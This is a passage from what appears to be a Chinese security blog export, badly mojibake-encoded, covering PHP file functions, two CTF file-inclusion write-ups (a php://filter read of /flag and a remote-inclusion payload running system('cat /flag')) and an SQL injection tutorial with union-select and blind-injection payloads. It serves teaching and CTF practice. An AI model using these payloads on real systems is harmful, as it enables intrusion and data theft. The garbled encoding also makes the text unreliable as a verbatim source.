æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚ è¯¥å‡½æ•°è®¿é—®æ–‡ä»¶æ—¶ï¼Œéµå¾ªä»¥ä¸‹é¡ºåºï¼š å¦‚æœè®¾ç½®äº† FILE_USE_INCLUDE_PATH æ ‡å¿—ï¼Œå‡½æ•°å°†é¦–å…ˆæ£€æŸ¥ filename å‚æ•°çš„å‰¯æœ¬æ˜¯å¦å­˜åœ¨äº PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰ä¸­ã€‚ å‡½æ•°å°†æ‰“å¼€æ–‡ä»¶ä»¥è¿›è¡Œå†™å…¥æ“ä½œã€‚ å¦‚æœè®¾ç½®äº† LOCK_EX æ ‡å¿—ï¼Œå‡½æ•°å°†å¯¹æ–‡ä»¶è¿›è¡Œé”å®šï¼ˆè·å–ç‹¬å é”å®šï¼‰ï¼Œä»¥ç¡®ä¿åœ¨å†™å…¥æ–‡ä»¶æ—¶ä¸ä¼šå‘ç”Ÿå†²çªã€‚ å¦‚æœè®¾ç½®äº† FILE_APPEND æ ‡å¿—ï¼Œå‡½æ•°å°†å°†å†™å…¥çš„æ•°æ®è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚å¦åˆ™ï¼Œå‡½æ•°å°†æ¸…é™¤æ–‡ä»¶çš„å†…å®¹å¹¶å†™å…¥æ–°çš„æ•°æ®ã€‚ å‡½æ•°å°†å†™å…¥æ•°æ®åˆ°æ–‡ä»¶ä¸­ã€‚ å‡½æ•°å°†å…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾å¯¹æ–‡ä»¶çš„æ‰€æœ‰é”å®šã€‚ â€‹\tâ€‹ fopenfopen() å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ– URLã€‚ fopen(filename,mode,include_path,context) å‚æ•° æè¿° filename å¿…éœ€ã€‚è§„å®šè¦æ‰“å¼€çš„æ–‡ä»¶æˆ– URLã€‚ mode å¿…éœ€ã€‚è§„å®šæ‚¨è¯·æ±‚åˆ°è¯¥æ–‡ä»¶æµçš„è®¿é—®ç±»å‹ã€‚å¯èƒ½çš„å€¼ï¼šâ€râ€ ï¼ˆåªè¯»æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ï¼‰â€r+â€ ï¼ˆè¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ï¼‰â€wâ€ ï¼ˆå†™å…¥æ–¹å¼æ‰“å¼€ï¼Œæ¸…é™¤æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ï¼‰â€w+â€ ï¼ˆè¯»å†™æ–¹å¼æ‰“å¼€ï¼Œæ¸…é™¤æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ï¼‰â€aâ€ ï¼ˆå†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾è¿›è¡Œå†™å…¥ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ï¼‰â€a+â€ ï¼ˆè¯»å†™æ–¹å¼æ‰“å¼€ï¼Œé€šè¿‡å°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾è¿›è¡Œå†™å…¥æ¥ä¿å­˜æ–‡ä»¶å†…å®¹ï¼‰â€xâ€ ï¼ˆåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¹¶ä»¥å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™è¿”å› FALSE å’Œä¸€ä¸ªé”™è¯¯ï¼‰â€x+â€ ï¼ˆåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¹¶ä»¥è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™è¿”å› FALSE å’Œä¸€ä¸ªé”™è¯¯ï¼‰ include_path å¯é€‰ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_pathï¼ˆåœ¨ php.ini ä¸­ï¼‰ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚ å®æˆ˜No.1 åœŸè±†å“¥ç»™çš„é¢˜ç›®?phphighlight_file(__FILE__);error_reporting(0);print(easy lfi, but no flag~~);$cmd = $_POST[cmd];//flag in /flagif (isset($cmd)) print (first one: . br); $cmd = preg_replace(/flag/i, , $cmd); echo $cmd; if (preg_match(/flag/i, $cmd)) include($cmd); åœŸè±†å“¥ï¼šflagä¸€èˆ¬åœ¨æ ¹ç›®å½•ä¸‹(æ ¹æœ¬æ²¡å¬åˆ°,åšäº†å¾ˆå¤šæ— ç”¨åŠŸï¼Œä½†å¶ç„¶æ¥è§¦åˆ°äº†ä¸€å¥è¯æœ¨é©¬) é¢˜è§£ï¼š â€‹\t$cmd = preg_replace(/flag/i, , $cmd);è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç”¨äºåˆ é™¤cmdä¸­å«æœ‰flagåœ°æ–¹ï¼Œç¬¬äºŒä¸ª if (preg_match(/flag/i, $cmd))ç”¨æ¥åˆ¤æ–­æ˜¯å¦å«æœ‰flagè¿™ä¸ªè¯å¦‚æœæœ‰åˆ™è¿›è¡Œifä¸‹çš„å†…å®¹ã€‚ â€‹\tæŒ‰é¢˜ç›®çš„å«ä¹‰æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºflflagagè¿™ä¸ªä½œä¸ºflagçš„æ›¿ä»£ â€‹\tå°è¯•ç›´æ¥è¿›è¡Œcmd=/flflagagè¿›è¡Œä¼ å‚ï¼Œå‘ç°å¹¶æ²¡æœ‰å‡ºç°å‚æ•°ï¼Œåˆ¤è¯»ä¼°è®¡è¿›è¡Œäº†éšè—ã€‚ä½¿ç”¨phpä¸­çš„php:filterä¼ªåè®®è¿›è¡Œè¯»å–ï¼Œä½¿ç”¨cmd=php://filter/read=convert.base64-encode/resource=/flagå°è¯•ä½¿ç”¨base64åŠ å¯†åè¯»å–ã€‚ â€‹\té¡µé¢å‡ºç°ç»è¿‡base64åŠ å¯†åçš„å†…å®¹ PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw== è§£å¯† ?php$FLAG = ROISdoudoubleble_cmcmdd_wiwinn; å‘ç°flagæ˜¯ä¸ªå˜é‡æ— æ³•ç›´æ¥é€šè¿‡includeåŒ…å«ç›´æ¥è¯»å‡ºã€‚ No.2 CTFHub æŠ€èƒ½æ ‘-RCE-æ–‡ä»¶åŒ…å«-è¿œç¨‹åŒ…å«?phperror_reporting(0);if (isset($_GET[file])) if (!strpos($_GET[file], flag)) include $_GET[file]; else echo Hacker!!!; else highlight_file(__FILE__);?hri dont have shell, how to get flag?bra href=phpinfo.phpphpinfo/a é¡µé¢ç»™äº†ä¸ªå°æç¤º phpinfo Directive Local Value Master Value allow_url_fopen On On allow_url_include On On é¢˜è§£ï¼š æŸ¥çœ‹é¢˜ç›® â€‹ if (!strpos($_GET[file], flag))å‘ç°é¢˜ç›®è¦æ±‚å¿…é¡»ä½¿ç”¨éå«flagçš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œåˆ™æ­¤æ—¶å¯ä»¥è€ƒè™‘è¿›è¡Œè¿œç¨‹åŒ…å«ã€‚åœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢å†™å…¥èƒ½è¿›è¡Œæ‰“å°å‡ºæ ¹ç›®å½•ä¸‹flagçš„ä»£ç ï¼Œå¦‚ï¼š ?php system(cat /flag); ? ä½¿ç”¨http://åè®®ï¼Œæœ€åæˆåŠŸè·å–ä»£ç ","tags":["CTF-Web","Web-PHP"],"categories":["web"]},{"title":"SQLæ³¨å…¥","path":"/posts/e73517db/","content":"SQLæ³¨å…¥æµç¨‹ æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼šåˆ¤æ–­æ˜¯å¦æœ‰æ¼æ´ï¼Œå¯»æ‰¾æ’å…¥ä½ç½® æ„é€ æ³¨å…¥è¯­å¥ï¼Œå¹¶åœ¨æ³¨å…¥ç‚¹æ³¨å…¥å½¢æˆæ–°çš„SQLè¯­å¥ æ–°å½¢æˆçš„SQLè¯­å¥æäº¤æ•°æ®åº“å¤„ç† æ•°æ®åº“æ‰§è¡Œæ–°çš„SQLè¯­å¥ï¼Œå¼•å‘æ³¨å…¥æ”»å‡» å‰ç½®çŸ¥è¯†1.ç‰¹åˆ«çš„æ•°æ®åº“ åœ¨MySQL 5.0ç‰ˆæœ¬ä¹‹åï¼ŒMySQLé»˜è®¤åœ¨æ•°æ®åº“ä¸­å­˜æ”¾ä¸€ä¸ªinformation_schemaçš„æ•°æ®åº“ï¼Œåœ¨è¯¥åº“ä¸­ï¼Œéœ€è¦è®°ä½ä¸‰ä¸ªè¡¨åï¼Œåˆ†åˆ«æ˜¯ï¼šschemataã€tablesã€columnsã€‚ schemataè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€‚ å…¶ä¸­è®°å½•æ•°æ®åº“åº“åçš„å­—æ®µåä¸ºï¼šschema_nameã€‚ tablesè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åã€‚ å…¶ä¸­è®°å½•æ•°æ®åº“åº“åå’Œè¡¨åçš„å­—æ®µååˆ†åˆ«æ˜¯ï¼štables_schemaå’Œtable_nameã€‚ columnsè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåã€‚ å…¶ä¸­è®°å½•æ•°æ®åº“åº“åã€è¡¨åå’Œå­—æ®µåçš„å­—æ®µååˆ†åˆ«æ˜¯ï¼štables_schemaã€table_nameå’Œcolumn_nameã€‚ 2.æ³¨é‡Šç¬¦ åœ¨MySQLä¸­ï¼Œå¸¸è§æ³¨é‡Šç¬¦çš„è¡¨è¾¾æ–¹å¼ï¼š â€‹ # â€¦â€¦ ï¼š#å·åé¢çš„éƒ½ä¼šè¢«æ³¨é‡Š â€‹ -- â€¦â€¦ ï¼š--å·åé¢çš„éƒ½ä¼šè¢«æ³¨é‡Šï¼Œä¸è¿‡åœ¨ -- çš„å‰åéƒ½éœ€è¦åŠ ç©ºæ ¼å†åŠ æ•°æ®(GETä¼ å‚æ—¶åªèƒ½ä½¿ç”¨--ï¼Œåçš„ç©ºæ ¼ç”¨+ä»£æ›¿) â€‹ /* ... */ ï¼šåœ¨æŸ¥è¯¢è¯­å¥ä¸­ä½¿ç”¨æ–œæ æ˜Ÿå·æ³¨é‡Šï¼Œä» å¼€å§‹åˆ° * ç»“æŸçš„éƒ¨åˆ†éƒ½è¢«è§†ä¸ºæ³¨é‡Šï¼Œä¸ä¼šè¢«æ‰§è¡Œã€‚ ä½†**/* ... */** çš„ç‰¹æ®Šç”¨æ³•--æ¡ä»¶æ³¨é‡Š æ¡ä»¶æ³¨é‡Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³¨é‡Šè¯­æ³•ï¼Œå®ƒå…è®¸åœ¨æ³¨é‡Šä¸­ä½¿ç”¨å…³é”®å­—ï¼Œè€Œè¿™äº›å…³é”®å­—åœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶ä¼šè¢«è§£æä¸ºç›¸åº”çš„æ“ä½œã€‚ è¯­æ³•æ ¼å¼ä¸ºï¼š /*!conditional_keyword query_part */ ä¾‹å¦‚ï¼šindex?id=-10 /*!union*/ /*!select*/ 1,2,3ç­‰åŒäºindex?id=-10 union select 1,2,3 SQLæ³¨å…¥å¸¸ç”¨åŸºç¡€è¯­å¥select version(); #æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ select user(); #æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·select database(); #æŸ¥çœ‹å½“å‰åº“å;select table_name from information_schema.tables where table_schema=database() ; #æŸ¥çœ‹å½“å‰åº“ä¸‹çš„è¡¨åselect group_concat(table_name) from information_schema.tables where table_schema=database() ; #åªå›æ˜¾ä¸€è¡Œæ•°æ®ä¸‹æŸ¥çœ‹å½“å‰åº“ä¸‹çš„å…¨éƒ¨è¡¨åselect column_name from information_schema.columns where table_schema=database() and table_name=xxx; #æŸ¥è¯¢åˆ—å-æŠŠxxxç¼“å­˜å‰é¢æŸ¥è¯¢åˆ°çš„è¡¨å SQLæ³¨å…¥å¸¸ç”¨å‡½æ•°è”åˆæŸ¥è¯¢(union)æ³¨å…¥ä½¿ç”¨1.concat()å‡½æ•° â€‹\tconcat()å‡½æ•°ï¼šå°†å¤šä¸ªä¸åŒå­—æ®µçš„å­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ concat(str1ï¼Œstr2) #è¯­æ³• æ³¨æ„ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ 2.group_concat()å‡½æ•° â€‹\tgroup_concat() å°†å¤šä¸ªåŒä¸ªå­—æ®µçš„å­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ group_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc] [separator â€˜åˆ†éš”ç¬¦â€™]) #è¯­æ³• æŠ¥é”™æ³¨å…¥ä½¿ç”¨1.extractvalue()å‡½æ•° â€‹\tä» MySQL 5.7.8 ç‰ˆæœ¬å¼€å§‹ï¼ŒExtractValue() å‡½æ•°å·²è¢«å¼ƒç”¨ â€‹\tExtractValue() å‡½æ•°æ¥æå– XML å­—ç¬¦ä¸²ä¸­çš„ç‰¹å®šè·¯å¾„çš„å€¼ã€‚ ExtractValue(xml_string, xpath_expression) xml_fragï¼šxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ˜¯ä¸€ä¸ªstringç±»å‹ã€‚ xpath_exprï¼šä½¿ç”¨xpathè¯­æ³•æ ¼å¼çš„è·¯å¾„ã€‚ 2.updataxml()å‡½æ•° xml_targetï¼šxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ˜¯ä¸€ä¸ªstringç±»å‹ã€‚ xpath_exprï¼šä½¿ç”¨xpathè¯­æ³•æ ¼å¼çš„è·¯å¾„ã€‚ new_xmlï¼šéœ€è¦æ›´æ–°çš„å†…å®¹ã€‚ 3.count()+rand()+floor()+group by()å‡½æ•° rand()å‡½æ•°ï¼šrand()è¿”å›0åˆ°1çš„éšæœºæ•°ã€‚rand(0)è¿”å›ä¸€ä¸ªå›ºå®šçš„0åˆ°1çš„ä¼ªéšæœºæ•°ã€‚ floor()å‡½æ•°ï¼šfloor(x)è¿”å›å°äºæˆ–ç­‰äº x çš„æœ€å¤§æ•´æ•°ã€‚ group byè¯­å¥ï¼šgroup byè¯­å¥å¯ä»¥æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„ï¼Œåœ¨åˆ†ç»„çš„åˆ—ä¸Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ COUNT, SUM, AVG,ç­‰å‡½æ•°ã€‚ å¸ƒå°”ç›²æ³¨ä½¿ç”¨1.substr()/substring()å‡½æ•° â€‹\tsubstr()/substring()å‡½æ•°ï¼šç”¨æ¥æˆªå–æ•°æ®åº“æŸä¸ªå­—æ®µä¸­çš„ä¸€éƒ¨åˆ†ã€‚ substr(stringï¼Œstartå¼€å§‹ä½ç½®ï¼Œlengthæˆªå–é•¿åº¦) #è¯­æ³• å‚æ•° stringï¼šå¿…é€‰ï¼Œæ•°æ®åº“ä¸­éœ€è¦æˆªå–çš„å­—æ®µ startï¼šå¿…é€‰ã€‚æ­£æ•°ï¼Œä»å­—ç¬¦ä¸²æŒ‡å®šä½ç½®å¼€å§‹æˆªå–ï¼›è´Ÿæ•°ï¼Œä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šä½ç½®å¼€å§‹ æˆªå–ï¼›0ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹æˆªå–ã€‚ lengthï¼šå¯é€‰ï¼Œéœ€è¦æˆªå–çš„é•¿åº¦ã€‚ç¼ºçœã€‚å³æˆªå–åˆ°ç»“æŸä½ç½® 2.ascii()å‡½æ•° â€‹\tascii()å‡½æ•°ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦è¾¹çš„æ•°å€¼ã€‚ ascii(str) #è¯­æ³• 2.length() å‡½æ•°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ length(str) #è¯­æ³• æ³¨å…¥ç‚¹åˆ†ç±»â‘ æ•°å­—å‹æ³¨å…¥ç‚¹ç±»ä¼¼çš„åç«¯è¯­å¥ $id=$_GET[id];$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql);$row = mysql_fetch_array($result); åœ¨ Web ç«¯å¤§æ¦‚æ˜¯ http://xxx.com/index.php?id=1 è¿™ç§å½¢å¼ï¼Œå…¶æ³¨å…¥ç‚¹ id ç±»å‹ä¸ºæ•°å­—ï¼Œæ‰€ä»¥å«æ•°å­—å‹æ³¨å…¥ç‚¹ã€‚ ç”¨1 and 1=1è¿›è¡Œç»„åˆå‡ºæ¥çš„sqlæ³¨å…¥è¯­å¥ä¸ºï¼š select * from news where id=1 and 1=1 â‘¡å­—ç¬¦å‹æ³¨å…¥ç‚¹ç±»ä¼¼çš„åç«¯è¯­å¥ $id=$_GET[id];$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql);$row = mysql_fetch_array($result); åœ¨ Web ç«¯å¤§æ¦‚æ˜¯ http://xxx.com/index.php?id=admin è¿™ç§å½¢å¼ï¼Œå…¶æ³¨å…¥ç‚¹id ç±»å‹ä¸ºå­—ç¬¦ç±»å‹ï¼Œæ‰€ä»¥å«å­—ç¬¦å‹æ³¨å…¥ç‚¹ã€‚ ä½¿ç”¨id=1 and 1=1 --+ç»„åˆå‡ºæ¥çš„sqlæ³¨å…¥è¯­å¥ä¸ºï¼š select * from news where id=admin and 1=1 --+ LIMIT 0,1; æ³¨æ„å¤šäº†ä¸€ä¸ªå¼•å·ã€‚ç”±äºæ³¨å…¥æ‹¼æ¥è¯­å¥åå¤šäº†ä¸€ä¸ª,éœ€è¦ç”¨æ³¨é‡Šç¬¦è¿›è¡Œæ¶ˆé™¤å¯¹è¯­å¥çš„å½±å“ â‘¢æœç´¢å‹æ³¨å…¥ç‚¹è¿™æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ³¨å…¥ç±»å‹ã€‚è¿™ç±»æ³¨å…¥ä¸»è¦æ˜¯æŒ‡åœ¨è¿›è¡Œæ•°æ®æœç´¢æ—¶æ²¡è¿‡æ»¤æœç´¢å‚æ•°ï¼Œä¸€èˆ¬åœ¨é“¾æ¥åœ°å€ä¸­æœ‰â€œkeywordå…³é”®å­—â€ï¼Œæœ‰çš„ä¸æ˜¾ç¤ºåœ¨çš„é“¾æ¥åœ°å€é‡Œé¢ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡æœç´¢æ¡†è¡¨å•æäº¤ã€‚æ­¤ç±»æ³¨å…¥ç‚¹æäº¤çš„ SQL è¯­å¥ï¼Œå…¶åŸå½¢å¤§è‡´ä¸ºï¼š select * from è¡¨å where å­—æ®µ like %å…³é”®å­—%`ã€‚ç»„åˆå‡ºæ¥çš„sqlæ³¨å…¥è¯­å¥ä¸ºï¼šselect * from news where search like %æµ‹è¯• % and %1%=%1%æµ‹è¯•% union select 1,2,3,4 and %= åˆ¤æ–­æ³¨å…¥ç‚¹æ³¨æ„åŒºåˆ«è¯­å¥æŠ¥é”™ä¸é¡µé¢æŠ¥é”™ã€é¡µé¢æ•°æ®ä¸æ­£ç¡®çš„åŒºåˆ« â€‹\t1.?id=1 and 1=1 å’Œ?id=1 and 1=2è¿›è¡Œæµ‹è¯•å¦‚æœ11é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”12é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚ â€‹\t2.?id=1 and 1=1 --+ / #å’Œ?id=1 and 1=2 --+ / #æˆ–ä½¿ç”¨?id and 1=1å’Œ?id and 1=2è¿›è¡Œæµ‹è¯•å¦‚æœ11é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”12é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚ â€‹\t3.?id=1% and 1=1 --+ / #å’Œ?id=1% and 1=2 --+ / #è¿›è¡Œæµ‹è¯•å¦‚æœ11é¡µé¢æ˜¾ç¤ºæ­£å¸¸å’ŒåŸé¡µé¢ä¸€æ ·ï¼Œå¹¶ä¸”12é¡µé¢æŠ¥é”™æˆ–è€…é¡µé¢éƒ¨åˆ†æ•°æ®æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ­¤å¤„ä¸ºæœç´¢å‹æ³¨å…¥ã€‚ æ³¨å…¥æ–¹æ³•è”åˆæŸ¥è¯¢æ³¨å…¥è”åˆæŸ¥è¯¢è¯­å¥ï¼š select a from b union select c from d where e; ä½¿ç”¨æ¡ä»¶ï¼šé¡µé¢å¯¹æŸ¥è¯¢è¯­å¥æœ‰å›æ˜¾æŸ¥è¯¢æ•°æ® æ³¨æ„äº‹é¡¹ï¼š ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥æ—¶,ä½äºunionå‰çš„è¯­å¥ä¸è¦å‡ºç°æŸ¥è¯¢çš„ç»“æœ(åç«¯åªé€‰æ‹©æŸ¥è¯¢ç»“æœç¬¬ä¸€è¡Œçš„æƒ…å†µï¼Œè‹¥å‰ä¸€éƒ¨åˆ†å¯ä»¥è¢«æŸ¥è¯¢ï¼Œåˆ™è”åˆæŸ¥è¯¢çš„éƒ¨åˆ†ä¸ä¼šå›æ˜¾) è‹¥å‰éƒ¨åˆ†æœ‰ç»“æœï¼Œå¯åœ¨æ¯æ¬¡çš„unionæŸ¥è¯¢åæ·»åŠ è¯­å¥limit n,1(næ ¹æ®é¢˜ç›®å®é™…è¿›è¡Œåˆ‡æ¢)èµ·åˆ°å›æ˜¾è”åˆæŸ¥è¯¢ç»“æœçš„ä½œç”¨ æ³¨ï¼šlimit num1ï¼Œnum2çš„ä½œç”¨ä¸ºä»ç¬¬num1è¡Œå¼€å§‹æ˜¾ç¤ºnum2è¡Œå†…å®¹ æ‰€éœ€å‡½æ•°1.concat()å‡½æ•° â€‹\tconcat()å‡½æ•°ï¼šå°†å¤šä¸ªä¸åŒå­—æ®µçš„å­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ concat(str1ï¼Œstr2) #è¯­æ³• æ³¨æ„ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ 2.group_concat()å‡½æ•° â€‹\tgroup_concat() å°†å¤šä¸ªåŒä¸ªå­—æ®µçš„å­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ group_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc] [separator â€˜åˆ†éš”ç¬¦â€™]) #è¯­æ³• æ³¨å…¥æµç¨‹ åˆ¤æ–­ç±»å‹ å­—æ®µæ•° è”åˆæŸ¥è¯¢(union)ï¼Œå¿…é€‰ä¿è¯unionå‰åä¸¤ä¸ªæŸ¥è¯¢çš„å­—æ®µæ•°ä¸€è‡´ï¼Œå³ä¸¤ä¸ªæŸ¥è¯¢ç»“æœæœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œå› æ­¤è¦å¯¹å‰ä¸€ä¸ªçš„å­—æ®µæ•°è¿›è¡Œåˆ¤æ–­ã€‚å¯ä»¥ä½¿ç”¨order by æ•°å­—è¿›è¡Œåˆ¤æ–­ æ³¨ï¼šorder by nè¡¨ç¤ºæŸ¥è¯¢ç»“æœé€šè¿‡ç¬¬nä¸ªå­—æ®µè¿›è¡Œæ’åº ä½¿ç”¨ç¤ºä¾‹ï¼š id=1 order by 1 --+ ä½¿ç”¨æ—¶ä¸æ–­å¢å¤§æ•°å­—ï¼Œå‡è®¾ç›´è‡³ç¬¬nä¸ªå‡ºç°é”™è¯¯ï¼Œä»è€Œåˆ¤æ–­å‡ºå­—æ®µæ•°ä¸ºn-1 å›æ˜¾ç‚¹ çŸ¥é“å­—æ®µæ•°ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¡®å®šåœ¨å“ªä¸ªå­—æ®µæ˜¯å›æ˜¾åˆ°é¡µé¢ä¸Šçš„ ç›´æ¥æ ¹æ®å­—æ®µæ•°ï¼Œè”åˆæŸ¥è¯¢æ•°å­—1ï¼Œ2ï¼Œ3...,ä»¥ä¸‰ä¸ªå­—æ®µæ•°ä¸ºä¾‹ id=1 order by union select 1,2,3 --+ ä»é¡µé¢ä¸ŠæŸ¥æ‰¾å›æ˜¾çš„æ˜¯å“ªä¸ªæ•°å­— çˆ†åº“åã€è¡¨åï¼Œå­—æ®µåï¼Œæ•°æ® â€‹\tä½¿ç”¨unionè¯­å¥åœ¨å›æ˜¾ä½ç½®å¯¼å‡ºæ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œç»“åˆä¸Šæ–‡ä¸­çš„SQLæ³¨å…¥å¸¸ç”¨åŸºç¡€è¯­å¥ ä»¥2ä½ç½®ä¸ºå›æ˜¾ç‚¹ï¼Œçˆ†è¡¨åä¸ºä¾‹ id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ å¸ƒå°”ç›²æ³¨æ„é€ SQLè¯­å¥ï¼Œåˆ©ç”¨andï¼Œorç­‰å…³é”®å­—æ¥å…¶åçš„è¯­å¥ true ã€ falseä½¿webé¡µé¢è¿”å›trueæˆ–è€…falseï¼Œä»è€Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„æ¥è·å–ä¿¡æ¯ ä½¿ç”¨æ¡ä»¶ï¼šé€‚ç”¨äºé¡µé¢æ²¡æœ‰å›æ˜¾å­—æ®µ(ä¸æ”¯æŒè”åˆæŸ¥è¯¢)ï¼Œä¸”webé¡µé¢è¿”å›True æˆ–è€… falseç±»ä¼¼çš„ç»“æœï¼ˆä¾‹å¦‚ï¼šç™»å½•æˆåŠŸã€ï¼‰ æ³¨æ„äº‹é¡¹ï¼š å‰é¢å‚æ•°åœ¨æ•°æ®åº“æ— ç»“æœæ—¶ï¼Œæ‹¼æ¥è¯­å¥ä½¿ç”¨å…³é”®è¯or å‰é¢å‚æ•°åœ¨æ•°æ®åº“æœ‰ç»“æœæ—¶ï¼Œæ‹¼æ¥è¯­å¥ä½¿ç”¨å…³é”®è¯and å¦å»ºè®®ä½¿ç”¨è„šæœ¬ æ³¨å…¥ä½¿ç”¨å‡½æ•°1.substr()/substring()å‡½æ•° â€‹\tsubstr()/substring()å‡½æ•°ï¼šç”¨æ¥æˆªå–æ•°æ®åº“æŸä¸ªå­—æ®µä¸­çš„ä¸€éƒ¨åˆ†ã€‚ substr(stringï¼Œstartå¼€å§‹ä½ç½®ï¼Œlengthæˆªå–é•¿åº¦) #è¯­æ³• å‚æ•° stringï¼šå¿…é€‰ï¼Œæ•°æ®åº“ä¸­éœ€è¦æˆªå–çš„å­—æ®µ 